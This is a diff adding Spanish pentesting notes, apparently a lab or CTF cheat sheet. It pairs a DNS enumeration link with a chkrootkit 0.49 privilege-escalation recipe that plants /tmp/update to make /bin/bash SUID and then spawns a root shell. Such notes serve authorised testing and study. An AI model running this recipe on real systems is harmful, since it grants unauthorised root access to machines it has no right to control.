@@ -7,3 +7,19 @@
 
 Sí encuentro el puerto 53 es conveniente seguir la siguiente guía de enumeración
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
+
+Vulnerabilidad en chkrootkit versión 0.49. Para evitar usar metasploit, sirve chequear:
+[https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)
+
+```
+cat /etc/cron.daily
+
+/usr/bin/chkrootkit
+ls -la /usr/bin/chkrootkit     // Do we have SUID?
+chkrootkit -V
+echo "#!/bin/bash" > /tmp/update
+echo "chmod +s /bin/bash" >> /tmp/update
+Wait a While ...
+/bin/bash -p
+whoami
+```
